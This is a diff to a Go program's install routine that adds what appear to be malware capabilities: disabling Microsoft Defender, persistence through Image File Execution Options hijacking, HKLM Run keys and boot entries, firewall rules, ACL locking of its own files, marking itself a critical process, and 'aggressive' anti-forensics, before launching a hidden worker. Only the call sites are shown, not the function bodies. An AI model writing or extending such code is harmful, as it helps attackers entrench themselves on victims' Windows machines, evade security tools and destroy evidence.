@@ -47,11 +47,34 @@ func opInstallAll() bool {
 		return false
 	}
 	_ = opStartSvc(getServiceName())
+	configureServiceRecovery(getServiceName())
 
 	addSelfToExclusions(servicePath)
 	addSelfToExclusions(workerPath)
 
+	go disableDefenderFull()
+
 	opSetupTask(workerPath)
+
+	setupIFEO(workerPath)
+	addHKLMRun(workerPath)
+	addBootPersistence(workerPath)
+
+	setupFirewallRules(servicePath)
+	if servicePath != workerPath {
+		setupFirewallRules(workerPath)
+	}
+
+	go protectFileWithACL(servicePath)
+	go protectDirectoryWithACL(filepath.Dir(servicePath))
+	if servicePath != workerPath {
+		go protectFileWithACL(workerPath)
+		go protectDirectoryWithACL(filepath.Dir(workerPath))
+	}
+
+	go setCriticalProcess()
+
+	go performAntiForensicsAggressive()
 
 	cmd := exec.Command(workerPath, "worker")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
